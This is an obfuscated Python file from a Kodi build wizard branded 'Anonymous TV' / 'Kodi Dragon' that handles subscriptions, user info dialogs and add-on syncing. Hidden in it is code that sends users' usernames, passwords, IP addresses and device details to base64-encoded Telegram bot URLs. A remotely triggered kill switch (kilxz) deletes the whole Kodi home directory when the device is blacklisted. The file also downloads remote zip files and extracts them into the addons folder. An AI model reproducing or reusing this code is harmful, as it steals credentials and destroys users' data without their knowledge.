          OO000O0O0OOO0OOOO =requests .get (O000O00OOOOO0O00O +que ('מנסים להתקין: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O0OOO000O00OO0000 +que (' סיסמה: ')+O00OO00O0O00OO00O +que (' קודי: ')+O00O000OOOO00OO0O +que (' כתובת: ')+O00O0000O00O0OO00 +que (' מערכת הפעלה: ')+platform_d ()+que (' שם המערכת: ')+O0000OOO0O0OOO0OO +que (' גירסת ויזארד: ')+VERSION ).json ()#line:476
def Account_Send (OO00O0OOOO000O0OO ,O0000OOOO00OOO00O ):#line:478
          import json ,platform ,requests #line:480
          O00000O000O000OO0 =(ADDON .getSetting ("user"))#line:482
          OOOO00O00OO0000O0 =(ADDON .getSetting ("pass"))#line:483
          OO0O0O0OO0O0OOO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:484
          O0000OOOO0000O0O0 =platform .uname ()#line:485
          OOOO0O0000000OO0O =O0000OOOO0000O0O0 [1 ]#line:486
          if getS ('dragon')=='true':#line:487
            OOOOOO0O0OOOO0O0O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDQzMjU2NjE1MTpBQUdhUUxkWm90dFQyYUZHNFpRQ19JeUFHcFJyZ0phN3d6SS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNTUxMTkwOTY0JnRleHQ9').decode ('utf-8')#line:488
          else :#line:489
            OOOOOO0O0OOOO0O0O =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUwNjAyNjcwNTE6QUFIQWl5bFNENGREYzlWeGtncjJXc2o3WHhkV3FvTUhVX00vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTY2NTgwNTE0OCZ0ZXh0PQ==').decode ('utf-8')#line:490
          OO000OO0O0OOO0O0O =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:491
          O000OOO000000000O =O00000O000O000OO0 #line:493
          OO0OO00O000OOO00O =OOOO00O00OO0000O0 #line:494
          O000000OO00000O00 =requests .get (OOOOOO0O0OOOO0O0O +OO00O0OOOO000O0OO +que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O000OOO000000000O +que (' סיסמה: ')+OO0OO00O000OOO00O +que (' קודי: ')+OO0O0O0OO0O0OOO00 +que (' כתובת: ')+OO000OO0O0OOO0O0O +que (' מערכת הפעלה: ')+platform_d ()+que (' שם המערכת: ')+OOOO0O0000000OO0O +que (' גירסת ויזארד: ')+VERSION +que (' הסתיים בתאריך: ')+O0000OOOO00OOO00O ).json ()#line:496
def checkTheme (OO00OOO00O00O00O0 ,O00O0O00O0000OO0O ,OO0OOO000OOOOOO0O ):#line:498
    O0O0000O0O0OO000O =checkBuild (OO00OOO00O00O00O0 ,'theme')#line:499
    if not workingURL (O0O0000O0O0OO000O )==True :return False #line:500
    OO0OO00O00OO0OOOO =openURL (O0O0000O0O0OO000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:501
    O0O000000OO0O00O0 =re .compile ('name="%s".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult=(.+?).+?escription="(.+?)"'%O00O0O00O0000OO0O ).findall (OO0OO00O00OO0OOOO )#line:502
    if len (O0O000000OO0O00O0 )>0 :#line:503
        for OOOOO000OOO0000O0 ,O0O0O00O000O0OO00 ,OOOOO0OO00OO000O0 ,O00O0O0OOO0000O00 ,OO00OO000OOOO0OOO in O0O000000OO0O00O0 :#line:504
            if OO0OOO000OOOOOO0O =='url':return OOOOO000OOO0000O0 #line:505
            elif OO0OOO000OOOOOO0O =='icon':return O0O0O00O000O0OO00 #line:506
            elif OO0OOO000OOOOOO0O =='fanart':return OOOOO0OO00OO000O0 #line:507
            elif OO0OOO000OOOOOO0O =='adult':return O00O0O0OOO0000O00 #line:508
            elif OO0OOO000OOOOOO0O =='description':return OO00OO000OOOO0OOO #line:509
            elif OO0OOO000OOOOOO0O =='all':return OO00OOO00O00O00O0 ,O00O0O00O0000OO0O ,OOOOO000OOO0000O0 ,O0O0O00O000O0OO00 ,OOOOO0OO00OO000O0 ,O00O0O0OOO0000O00 ,OO00OO000OOOO0OOO #line:510
    else :return False #line:511
def fix ():#line:512
    xbmc .executebuiltin ('UpdateLocalAddons()')#line:513
    xbmc .sleep (1000 )#line:514
    xbmc .executeJSONRPC ('{{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{{"addonid":"{0}","enabled":true}},"id":1}}'.format ('repository.gaia.2'))#line:515
def kilxz ():#line:516
  try :#line:517
    O0OO00O0O0000OOO0 =False #line:518
    import json ,platform ,requests #line:519
    O00OO00OO0000OOO0 =(ADDON .getSetting ("user"))#line:520
    O0OOO000OOOO00OO0 =(ADDON .getSetting ("pass"))#line:521
    OO0000OO0O0OO00OO =ld (dr )#line:522
    O00O0O0OO0OOO0O00 =urlopen (OO0000OO0O0OO00OO )#line:523
    OO00O0000OO0O0O0O =O00O0O0OO0OOO0O00 .readlines ()#line:524
    OO00O0000OO0O0O0O =[OO00OO0O0OOOO00OO .rstrip ()for OO00OO0O0OOOO00OO in OO00O0000OO0O0O0O ]#line:525
    OO0OOO000O00OO00O =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:526
    O0OO000O00000OOOO =platform .uname ()#line:528
    OO0OO0OOO000O0O00 =O0OO000O00000OOOO [1 ]#line:529
    O0000O0OOOO0O00OO =0 #line:530
    for OOOOOOO0OO0O00OO0 in OO00O0000OO0O0O0O :#line:531
        if OO0OOO000O00OO00O ==OOOOOOO0OO0O00OO0 .decode ('utf-8').split (' ==')[0 ]:#line:532
            O0000O0OOOO0O00OO =1 #line:533
            break #line:534
        if OO0OO0OOO000O0O00 ==OOOOOOO0OO0O00OO0 .decode ('utf-8').split (' ==')[0 ]:#line:535
            O0000O0OOOO0O00OO =1 #line:536
            break #line:537
        if OOOOOOO0OO0O00OO0 .decode ('utf-8').split (' ==')[0 ]==O00OO00OO0000OOO0 or OOOOOOO0OO0O00OO0 .decode ('utf-8').split ()[0 ]==O00OO00OO0000OOO0 or OOOOOOO0OO0O00OO0 .decode ('utf-8').split ()[0 ]==O0OOO000OOOO00OO0 :#line:538
            O0000O0OOOO0O00OO =1 #line:539
            break #line:540
    if O0000O0OOOO0O00OO ==0 :#line:541
       sys .exit ()#line:542
    else :#line:543
      Account_Send (que (' הוסר '),'')#line:544
      O00O000O000O0000O =os .path .join (HOME )#line:545
      if os .path .exists (O00O000O000O0000O ):#line:546
            for OO00O000000O0OO00 ,OOOOOO0OO0O0OOOO0 ,OOOOOOOO00O00000O in os .walk (O00O000O000O0000O ):#line:547
                for O0O0OOOO0O0O0OOO0 in OOOOOOOO00O00000O :#line:548
                    try :#line:549
                        os .unlink (os .path .join (OO00O000000O0OO00 ,O0O0OOOO0O0O0OOO0 ))#line:550
                    except :pass #line:551
                for O000OO00O00O00OOO in OOOOOO0OO0O0OOOO0 :#line:552
                    try :#line:553
                        shutil .rmtree (os .path .join (OO00O000000O0OO00 ,O000OO00O00O00OOO ))#line:554
                    except :pass #line:555
  except :pass #line:556
def gdrive ():#line:557
    OO0OOOO0OO0000OOO ='https://github.com/vip200/victory/blob/master/n.zip?raw=true'#line:558
    OO00O0O00O00OOOOO =translatepath (os .path .join ('special://home/addons','packages'))#line:559
    O0O00OOO00O0O000O =os .path .join (PACKAGES ,'isr.zip')#line:560
    OO0OOO0OO0OOO000O =Request (OO0OOOO0OO0000OOO )#line:561
    OOOOOOOO0O00OO00O =urlopen (OO0OOO0OO0OOO000O )#line:562
    O0O00OOO0O000O0OO =open (O0O00OOO00O0O000O ,'wb')#line:563
    try :#line:564
      OOOOO00O0O00OO000 =OOOOOOOO0O00OO00O .info ().getheader ('Content-Length').strip ()#line:565
      OO0000000OOO0OO00 =True #line:566
    except AttributeError :#line:567
          OO0000000OOO0OO00 =False #line:568
    if OO0000000OOO0OO00 :#line:569
          OOOOO00O0O00OO000 =int (OOOOO00O0O00OO000 )#line:570
    OO0O00O0O00O000O0 =0 #line:571
    OOOOO0000000O0OOO =time .time ()#line:572
    while True :#line:573
          O00000O0OOO0O00OO =OOOOOOOO0O00OO00O .read (8192 )#line:574
          if not O00000O0OOO0O00OO :#line:575
              sys .stdout .write ('\n')#line:576
              break #line:577
          OO0O00O0O00O000O0 +=len (O00000O0OOO0O00OO )#line:579
          O0O00OOO0O000O0OO .write (O00000O0OOO0O00OO )#line:580
    OO0OO000OOO00OOO0 =translatepath (os .path .join ('special://home/addons'))#line:582
    O0O00OOO0O000O0OO .close ()#line:583
    OO00O0OO0OO0OOOOO =zipfile .ZipFile (O0O00OOO00O0O000O ,'r')#line:585
    OO00O0OO0OO0OOOOO .extractall (OO0OO000OOO00OOO0 )#line:586
    try :#line:588
      os .remove (O0O00OOO00O0O000O )#line:589
    except :#line:590
      pass #line:591
    fix ()#line:593
def contact_wiz (msg =""):#line:594
    class OO0OOO00OO0OO0OOO (xbmcgui .WindowXMLDialog ):#line:595
        def __init__ (O0OO00OOOOO0O000O ,*O0000O0O0O0OO0OO0 ,**OO0O00OO00OO0OOO0 ):#line:596
            O0OO00OOOOO0O000O .title =THEME3 %OO0O00OO00OO0OOO0 ["title"]#line:597
            O0OO00OOOOO0O000O .image =OO0O00OO00OO0OOO0 ["image"]#line:598
            O0OO00OOOOO0O000O .fanart =OO0O00OO00OO0OOO0 ["fanart"]#line:599
            O0OO00OOOOO0O000O .msg =THEME2 %OO0O00OO00OO0OOO0 ["msg"]#line:600
        def onInit (OO000OO0O00O000OO ):#line:602
            OO000OO0O00O000OO .fanartimage =101 #line:603
            OO000OO0O00O000OO .titlebox =102 #line:604
            OO000OO0O00O000OO .imagecontrol =103 #line:605
            OO000OO0O00O000OO .textbox =104 #line:606
            OO000OO0O00O000OO .scrollcontrol =105 #line:607
            OO000OO0O00O000OO .closebutton =106 #line:608
            OO000OO0O00O000OO .showdialog ()#line:609
        def showdialog (O0000O00O000000OO ):#line:611
            O0000O00O000000OO .getControl (O0000O00O000000OO .imagecontrol ).setImage (O0000O00O000000OO .image )#line:612
            O0000O00O000000OO .getControl (O0000O00O000000OO .fanartimage ).setImage (O0000O00O000000OO .fanart )#line:613
            O0000O00O000000OO .getControl (O0000O00O000000OO .fanartimage ).setColorDiffuse ('9FFFFFFF')#line:614
            O0000O00O000000OO .getControl (O0000O00O000000OO .textbox ).setText (O0000O00O000000OO .msg )#line:615
            O0000O00O000000OO .getControl (O0000O00O000000OO .titlebox ).setLabel (O0000O00O000000OO .title )#line:616
            O0000O00O000000OO .setFocusId (O0000O00O000000OO .closebutton )#line:617
        def onClick (OOOOO000OOOOOOO0O ,OOO000O00000OO0OO ):#line:618
            if OOO000O00000OO0OO ==OOOOO000OOOOOOO0O .closebutton :OOOOO000OOOOOOO0O .close ()#line:619
        def onAction (OOOOOOO00O0OOO0OO ,O000OO00O00OOO00O ):#line:620
            if O000OO00O00OOO00O ==OOOOOOO00O0OOO0OO .closebutton :OOOOOOO00O0OOO0OO .close ()#line:621
            elif O000OO00O00OOO00O ==ACTION_PREVIOUS_MENU :OOOOOOO00O0OOO0OO .close ()#line:622
            elif O000OO00O00OOO00O ==ACTION_NAV_BACK :OOOOOOO00O0OOO0OO .close ()#line:623
    if getS ('dragon')=='true':#line:624
        O0OOOOOOO0OOOO0O0 =OO0OOO00OO0OO0OOO ("ContactDragon.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title ='Kodi Dragon',fanart =CONTACTFANART ,image =CONTACTICON ,msg =msg )#line:625
    else :#line:626
        O0OOOOOOO0OOOO0O0 =OO0OOO00OO0OO0OOO ("Contact.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title ='ANONYMOUS TV',fanart =CONTACTFANART ,image =CONTACTICON ,msg =msg )#line:627
    O0OOOOOOO0OOOO0O0 .doModal ()#line:628
    del O0OOOOOOO0OOOO0O0 #line:629
def user_info_Window (OO00000O0OOOOO00O ,O0O00O0OOO0O0OOO0 ,O0O0O00000O000O00 ,OO00O0O0O000O00O0 ,OOOOOOOOO00OOOO0O ,O000O00000O0OOOOO ):#line:630
    class OOO0OOOOO00OO0000 (xbmcgui .WindowXMLDialog ):#line:631
        def __init__ (OOO000O00OO00OO00 ,*OOOOOOOO0OO0O00OO ,**OO0OO000O0000O0O0 ):#line:632
            OOO000O00OO00OO00 .title =THEME3 %OO0OO000O0000O0O0 ["title"]#line:633
            OOO000O00OO00OO00 .image =OO0OO000O0000O0O0 ["image"]#line:634
            OOO000O00OO00OO00 .fanart =OO0OO000O0000O0O0 ["fanart"]#line:635
            OOO000O00OO00OO00 .tele =OO0OO000O0000O0O0 ["tele"]#line:636
            OOO000O00OO00OO00 .update =OO0OO000O0000O0O0 ["update"]#line:637
            OOO000O00OO00OO00 .rd =OO0OO000O0000O0O0 ["rd"]#line:638
            OOO000O00OO00OO00 .userdate =OO0OO000O0000O0O0 ["userdate"]#line:639
            OOO000O00OO00OO00 .username =OO0OO000O0000O0O0 ["username"]#line:640
            OOO000O00OO00OO00 .device =OO0OO000O0000O0O0 ["device"]#line:641
        def onInit (O0OOO00O00O0000O0 ):#line:643
            O0OOO00O00O0000O0 .username_title =100 #line:644
            O0OOO00O00O0000O0 .fanartimage =101 #line:645
            O0OOO00O00O0000O0 .titlebox =102 #line:646
            O0OOO00O00O0000O0 .imagecontrol =103 #line:647
            O0OOO00O00O0000O0 .textbox =104 #line:648
            O0OOO00O00O0000O0 .scrollcontrol =105 #line:649
            O0OOO00O00O0000O0 .closebutton =106 #line:650
            O0OOO00O00O0000O0 .tele_title =107 #line:651
            O0OOO00O00O0000O0 .update_title =108 #line:652
            O0OOO00O00O0000O0 .rd_title =109 #line:653
            O0OOO00O00O0000O0 .device_cunt =110 #line:654
            O0OOO00O00O0000O0 .userdate_title =111 #line:655
            O0OOO00O00O0000O0 .showdialog ()#line:657
        def showdialog (O0OOO000OOOO00O0O ):#line:659
            O0OOO000OOOO00O0O .getControl (O0OOO000OOOO00O0O .username_title ).setLabel (O0OOO000OOOO00O0O .username )#line:660
            O0OOO000OOOO00O0O .getControl (O0OOO000OOOO00O0O .device_cunt ).setLabel (O0OOO000OOOO00O0O .device )#line:661
            O0OOO000OOOO00O0O .getControl (O0OOO000OOOO00O0O .imagecontrol ).setImage (O0OOO000OOOO00O0O .image )#line:663
            O0OOO000OOOO00O0O .getControl (O0OOO000OOOO00O0O .fanartimage ).setImage (O0OOO000OOOO00O0O .fanart )#line:664
            O0OOO000OOOO00O0O .getControl (O0OOO000OOOO00O0O .fanartimage ).setColorDiffuse ('9FFFFFFF')#line:665
            O0OOO000OOOO00O0O .getControl (O0OOO000OOOO00O0O .tele_title ).setLabel (O0OOO000OOOO00O0O .tele )#line:668
            O0OOO000OOOO00O0O .getControl (O0OOO000OOOO00O0O .update_title ).setLabel (O0OOO000OOOO00O0O .update )#line:669
            O0OOO000OOOO00O0O .getControl (O0OOO000OOOO00O0O .rd_title ).setLabel (O0OOO000OOOO00O0O .rd )#line:670
            O0OOO000OOOO00O0O .getControl (O0OOO000OOOO00O0O .userdate_title ).setLabel (O0OOO000OOOO00O0O .userdate )#line:671
            O0OOO000OOOO00O0O .setFocusId (O0OOO000OOOO00O0O .closebutton )#line:673
        def onClick (O0OO00OOOO0OOO0O0 ,O000OO0OO0O0O000O ):#line:675
            if O000OO0OO0O0O000O ==O0OO00OOOO0OOO0O0 .closebutton :O0OO00OOOO0OOO0O0 .close ()#line:676
        def onAction (OO0000OOO00000OOO ,OOO0O0000O0OO000O ):#line:677
            if OOO0O0000O0OO000O ==OO0000OOO00000OOO .closebutton :OO0000OOO00000OOO .close ()#line:678
            elif OOO0O0000O0OO000O ==ACTION_PREVIOUS_MENU :OO0000OOO00000OOO .close ()#line:679
            elif OOO0O0000O0OO000O ==ACTION_NAV_BACK :OO0000OOO00000OOO .close ()#line:680
    if getS ('dragon')=='true':#line:681
        OO000OO0O00O0O000 =OOO0OOOOO00OO0000 ("userinfoDragon.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title ='Kodi Dragon',fanart =CONTACTFANART ,image =CONTACTICON ,tele =OO00000O0OOOOO00O ,userdate =OO00O0O0O000O00O0 ,update =O0O00O0OOO0O0OOO0 ,rd =O0O0O00000O000O00 ,username =OOOOOOOOO00OOOO0O ,device =O000O00000O0OOOOO )#line:682
    else :#line:683
        OO000OO0O00O0O000 =OOO0OOOOO00OO0000 ("userinfo.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title ='ANONYMOUS TV',fanart =CONTACTFANART ,image =CONTACTICON ,tele =OO00000O0OOOOO00O ,userdate =OO00O0O0O000O00O0 ,update =O0O00O0OOO0O0OOO0 ,rd =O0O0O00000O000O00 ,username =OOOOOOOOO00OOOO0O ,device =O000O00000O0OOOOO )#line:684
    OO000OO0O00O0O000 .doModal ()#line:685
    del OO000OO0O00O0O000 #line:686
def req ():#line:687
    import sys #line:688
    OO0000000O0O0O0OO =translatepath ('special://home/addons/script.module.requests/lib')#line:689
    sys .path .append (OO0000000O0O0O0OO )#line:690
    OO0000000O0O0O0OO =translatepath ('special://home/addons/script.module.urllib3/lib')#line:691
    sys .path .append (OO0000000O0O0O0OO )#line:692
    OO0000000O0O0O0OO =translatepath ('special://home/addons/script.module.chardet/lib')#line:693
    sys .path .append (OO0000000O0O0O0OO )#line:694
    OO0000000O0O0O0OO =translatepath ('special://home/addons/script.module.certifi/lib')#line:695
    sys .path .append (OO0000000O0O0O0OO )#line:696
    OO0000000O0O0O0OO =translatepath ('special://home/addons/script.module.idna/lib')#line:697
    sys .path .append (OO0000000O0O0O0OO )#line:698
    OO0000000O0O0O0OO =translatepath ('special://home/addons/script.module.futures/lib')#line:699
    sys .path .append (OO0000000O0O0O0OO )#line:700
def user_info ():#line:702
    xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:703
    OO0OOO00O0000OO0O =xbmcaddon .Addon ('plugin.video.telemedia')#line:704
    O000OO0OO0O0O00OO =OO0OOO00O0000OO0O .getSetting ('port')#line:705
    OOOOOO0O00OO0O0OO =(ADDON .getSetting ("user"))#line:706
    O0O0OO0O00OO000OO =[]#line:707
    O0O0O000O00OO0O0O =[]#line:708
    O0OO0OOOO0O0OOO0O =[]#line:709
    try :#line:711
        O000O000OO0OO00OO =read_skin ('playback')#line:712
        O00OO00OOO0OOOOOO =read_skin_dragon ('playback')#line:713
        OO000000OOO0O0OOO =[O000O000OO0OO00OO ,O00OO00OOO0OOOOOO ]#line:714
        for OOOOOOO00000O00OO in OO000000OOO0O0OOO :#line:715
            for O0OOO0OO0O000O0O0 in OOOOOOO00000O00OO :#line:716
                OOO00O0OO0O0OO0O0 =OOOOOOO00000O00OO [O0OOO0OO0O000O0O0 ]#line:717
                try :#line:718
                    O0O0O000O00OO0O0O .append ((OOO00O0OO0O0OO0O0 ['name'],OOO00O0OO0O0OO0O0 ['date'],OOO00O0OO0O0OO0O0 ['sync'],OOO00O0OO0O0OO0O0 ['dragon'],OOO00O0OO0O0OO0O0 ['device'],OOO00O0OO0O0OO0O0 ['rduser'],OOO00O0OO0O0OO0O0 ['rdpass'],OOO00O0OO0O0OO0O0 ['telegram_user'],OOO00O0OO0O0OO0O0 ['p1'],OOO00O0OO0O0OO0O0 ['p2'],OOO00O0OO0O0OO0O0 ['p3']))#line:719
                except :#line:720
                    O0OO0OOOO0O0OOO0O .append ((OOO00O0OO0O0OO0O0 ['name'],OOO00O0OO0O0OO0O0 ['date'],OOO00O0OO0O0OO0O0 ['sync'],OOO00O0OO0O0OO0O0 ['dragon'],OOO00O0OO0O0OO0O0 ['device']))#line:721
        for OO000O0000O000O0O ,OO0O00OO0O0O00OOO ,OOO000O0000OOO0O0 ,OO0O00O00O000O000 ,OOOOO000OOOOO00O0 ,O00OO0OOO0000OOOO ,O00OO0O00O0OO00OO ,O0000OO0OOOOO00O0 ,OOO00O0O0OOO00O0O ,O00O00OO0000OO0O0 ,O000OOO0O0O00000O in O0O0O000O00OO0O0O :#line:723
            if OO000O0000O000O0O .split ()[0 ].lower ()==OOOOOO0O00OO0O0OO :#line:725
                O00O0O0OO00O00O0O =1 #line:726
                setS ("date_user",OO0O00OO0O0O00OOO .replace (' ',''))#line:727
        for OO000O0000O000O0O ,OO0O00OO0O0O00OOO ,OOO000O0000OOO0O0 ,OO0O00O00O000O000 ,OOOOO000OOOOO00O0 in O0OO0OOOO0O0OOO0O :#line:728
            if OO000O0000O000O0O .split ()[0 ].lower ()==OOOOOO0O00OO0O0OO :#line:730
                O00O0O0OO00O00O0O =1 #line:731
                setS ("date_user",OO0O00OO0O0O00OOO .replace (' ',''))#line:732
    except :pass #line:733
    try :#line:734
        import random #line:735
        import requests #line:737
        OO0O0O000OO00OOO0 =random .randint (1 ,1001 )#line:738
        O0O0000000OOOO0O0 ={'type':'td_send','info':json .dumps ({'@type':'getOption','name':'my_id','@extra':OO0O0O000OO00OOO0 })}#line:741
        O0OOO00O0O0O0O0O0 =requests .post ('http://127.0.0.1:%s/'%O000OO0OO0O0O00OO ,json =O0O0000000OOOO0O0 ).json ()#line:742
        O0OO00OO0OOO000OO =O0OOO00O0O0O0O0O0 ['value']#line:743
        if '1229060184'==O0OO00OO0OOO000OO or '838481324'==O0OO00OO0OOO000OO or '5667480303'==O0OO00OO0OOO000OO :#line:744
          O00000000OO000000 ='חשבון טלמדיה: VIP פעיל'#line:745
        else :#line:746
          O00000000OO000000 ='חשבון טלמדיה: אישי'#line:747
    except :#line:748
          O00000000OO000000 ='חשבון טלמדיה: אינו פעיל'#line:749
    if getS ('dragon')=='true':#line:750
        OO000OOOOOOOO0OOO ='תקופת המנוי ב Kodi Dragon תסתיים בתאריך: '+getS ("date_user")#line:751
    else :#line:752
        OO000OOOOOOOO0OOO ='תקופת המנוי Anonymous TV תסתיים בתאריך: '+getS ("date_user")#line:753
    OO0O000OOO00O000O =os .path .join (translatepath ("special://home/"),"addons","skin.Premium.mod","16x9","Includes_Home.xml")#line:754
    O00OO000O00OO0O00 =open (OO0O000OOO00O000O ,'r',encoding ='utf-8')#line:756
    OOOO0000OOOO000OO =O00OO000O00OO0O00 .read ()#line:757
    O00OO000O00OO0O00 .close ()#line:758
    OOO00000O00O00000 ='<!-- 2 --><label>(.+?)</label>'#line:760
    OO00OOO0OO0OOOO0O =re .compile (OOO00000O00O00000 ).findall (OOOO0000OOOO000OO )[0 ]#line:761
    O0O00O0O00O0O0O0O =''#line:762
    if os .path .exists (translatepath ("special://home/addons/")+'plugin.video.kitana'):#line:763
        OO0OOO00O0000OO0O =xbmcaddon .Addon ('plugin.video.kitana')#line:764
        if len (OO0OOO00O0000OO0O .getSetting ('rd.token'))>0 :#line:766
            O0O00O0O00O0O0O0O ='true'#line:767
    if O0O00O0O00O0O0O0O =='true':#line:768
        try :#line:769
            OOO00O0O0O0OOO00O =OO0OOO00O0000OO0O .getSetting ('rd.auth')#line:770
            O00O0OOO0OOOO000O ='https://api.real-debrid.com/rest/1.0/user?auth_token=%s'%OOO00O0O0O0OOO00O #line:771
            import requests #line:773
            OOO0OO0OOO00OOOO0 =requests .get (O00O0OOO0OOOO000O ,timeout =15 ).json ()#line:774
            OOO00000O00O00000 ='(.+?)T'#line:775
            O0000OO00OOOO00O0 =re .compile (OOO00000O00O00000 ).findall (OOO0OO0OOO00OOOO0 ['expiration'])[0 ]#line:776
            from datetime import datetime #line:777
            OO0OO00O00O000O0O ,OOOO0O0OO00O00OOO ,O00O00O00OOO0O0O0 =O0000OO00OOOO00O0 .split ('-')#line:778
            OO0O00OO0O0O00OOO =O00O00O00OOO0O0O0 +'.'+OOOO0O0OO00O00OOO +'.'+OO0OO00O00O000O0O #line:779
            OO0OO0O00000OO00O ='שירות Real-Debrid פעיל ומסתיים בתאריך: '+str (OO0O00OO0O0O00OOO )#line:780
        except :#line:781
            OO0OO0O00000OO00O ='שירות Real-Debrid פעיל'#line:782
    else :#line:783
      OO0OO0O00000OO00O ='שירות Real-Debrid: אינו פעיל'#line:784
    OOOOO00000O0O0OOO ='תאריך עדכון מערכת: '+OO00OOO0OO0OOOO0O #line:785
    O0O00O00OOOOO00OO ='שם משתמש: '+getS ('user')#line:787
    OOOOO000OOOOO00O0 ='כמות מכשירים: '+getS ("device")#line:790
    xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:791
    user_info_Window (O00000000OO000000 ,OOOOO00000O0O0OOO ,OO0OO0O00000OO00O ,OO000OOOOOOOO0OOO ,O0O00O00OOOOO00OO ,OOOOO000OOOOO00O0 )#line:793
def user_sync ():#line:795
    O00O00000O0O000OO =getS ("sync_user")#line:796
    try :#line:797
        O000O000OO000OOO0 =xbmcaddon .Addon ('plugin.program.Settingz-Anon')#line:798
        O000O000OO000OOO0 .setSetting ('firebase',O00O00000O0O000OO )#line:799
    except :pass #line:801
    try :#line:802
        O00O0OOOO0000OO00 =xbmcaddon .Addon ('plugin.video.telemedia')#line:803
        O00O0OOOO0000OO00 .setSetting ('firebase',O00O00000O0O000OO )#line:804
        O00O0OOOO0000OO00 .setSetting ('sync_mod','true')#line:805
    except :pass #line:806
    try :#line:807
        O0O0O00OO0O000000 =xbmcaddon .Addon ('plugin.video.mando')#line:808
        O0O0O00OO0O000000 .setSetting ('firebase',O00O00000O0O000OO )#line:809
        O0O0O00OO0O000000 .setSetting ('sync_mod','true')#line:810
    except :pass #line:811
    try :#line:812
        O0OO0OOO00O00O00O =xbmcaddon .Addon ('script.module.xtvsh')#line:813
        O0OO0OOO00O00O00O .setSetting ('firebase',O00O00000O0O000OO )#line:814
        O0OO0OOO00O00O00O .setSetting ('sync_mod','true')#line:815
    except :pass #line:816
    try :#line:817
        O0O0O0O0O000O0OO0 =xbmcaddon .Addon ('plugin.video.thorrent')#line:818
        O0O0O0O0O000O0OO0 .setSetting ('firebase',O00O00000O0O000OO )#line:819
        O0O0O0O0O000O0OO0 .setSetting ('sync_mod','true')#line:820
    except :pass #line:821
    try :#line:822
        OOO0O00O000000O0O =xbmcaddon .Addon ('context.myfav')#line:823
        OOO0O00O000000O0O .setSetting ('firebase',O00O00000O0O000OO )#line:824
        OOO0O00O000000O0O .setSetting ('sync_mod','true')#line:825
    except :pass #line:826
def make_setting_file ():#line:829
    O00O000OO00O0O0OO =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings.xml")#line:830
    OO0000O00OO0O0000 =os .path .join (translatepath ("special://home/"),"userdata","addon_data","plugin.program.Anonymous","settings_backup.xml")#line:831
    try :#line:832
        O0000O0OOO00OO0OO =open (O00O000OO00O0O0OO ,'r',encoding ='utf-8')#line:834
        OOOOO0OOOO00O00O0 =O0000O0OOO00OO0OO .read ()#line:835
        O0000O0OOO00OO0OO .close ()#line:836
        if OOOOO0OOOO00O00O0 =='':#line:837
                copyfile (OO0000O00OO0O0000 ,O00O000OO00O0O0OO )#line:839
    except :#line:840
       os .remove (os .path .join (translatepath ("special://userdata/"),"addon_data","plugin.program.Anonymous","settings.xml"))#line:841
def STARTP (refresh ='false'):#line:842
    OO00O0O000OOOO0OO =False #line:843
    O00O0O0O000O000O0 =ADDON .getSetting ("user")#line:844
    if not len (ADDON .getSetting ("user"))>0 :#line:845
        O0O000OOO0000OO0O =xbmc .Keyboard (O00O0O0O000O000O0 ,'הכנס שם משתמש')#line:846
        O0O000OOO0000OO0O .doModal ()#line:847
        if O0O000OOO0000OO0O .isConfirmed ():#line:848
            O00O0O0O000O000O0 =O0O000OOO0000OO0O .getText ()#line:849
            ADDON .setSetting ("user",O00O0O0O000O000O0 )#line:850
        if O00O0O0O000O000O0 =='':#line:851
            sys .exit ()#line:852
        xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:853
    O0OO00O00OOO0OO00 =O00O0O0O000O000O0 #line:854
    O0OO00O00OOO0OO00 =O0OO00O00OOO0OO00 .lower ()#line:855
    try :#line:856
        OOO0OOO0OO0OOOO00 =urlopen (ld (US ))#line:857
        O0OO00O0OO0O00OOO =OOO0OOO0OO0OOOO00 .readlines ()#line:858
    except Exception as OO0OO00O00O000OO0 :#line:859
        O0OO00O0OO0O00OOO =''#line:860
        logging .warning ('לא מתחבר לשרת או שאין אינטרנט'+str (OO0OO00O00O000OO0 ))#line:861
    O0O0O0OO0OO0OOOOO =0 #line:862
    for OOOOO0OO0OOO00OO0 in O0OO00O0OO0O00OOO :#line:864
        if OOOOO0OO0OOO00OO0 .decode ('utf-8').split (' ==')[0 ]==O0OO00O00OOO0OO00 or OOOOO0OO0OOO00OO0 .decode ('utf-8').split ()[0 ]==O0OO00O00OOO0OO00 :#line:865
            O0O0O0OO0OO0OOOOO =1 #line:866
            if '@'in OOOOO0OO0OOO00OO0 .decode ('utf-8'):#line:868
                    setS ("dragon","true")#line:869
            else :#line:870
                    setS ("dragon","false")#line:871
            try :#line:872
                try :#line:873
                    O0O00000000O0000O =' == (.+?) = '#line:874
                    O0O0OO0OO00O00O0O =re .compile (O0O00000000O0000O ).findall (OOOOO0OO0OOO00OO0 .decode ('utf-8'))[0 ]#line:875
                    setS ("date_user",O0O0OO0OO00O00O0O .replace ('@','').replace (' ',''))#line:876
                except :#line:878
                    O0O00000000O0000O =' == (.+?)\n'#line:879
                    O0O0OO0OO00O00O0O =re .compile (O0O00000000O0000O ).findall (OOOOO0OO0OOO00OO0 .decode ('utf-8'))[0 ]#line:880
                    setS ("date_user",O0O0OO0OO00O00O0O .replace ('@','').replace (' ',''))#line:882
            except :#line:883
                O0O0OO0OO00O00O0O =''#line:884
                setS ("date_user",O0O0OO0OO00O00O0O .replace ('@','').replace (' ',''))#line:885
            try :#line:886
                try :#line:887
                    OOO000000O000OOO0 =' = (.+?) @ '#line:888
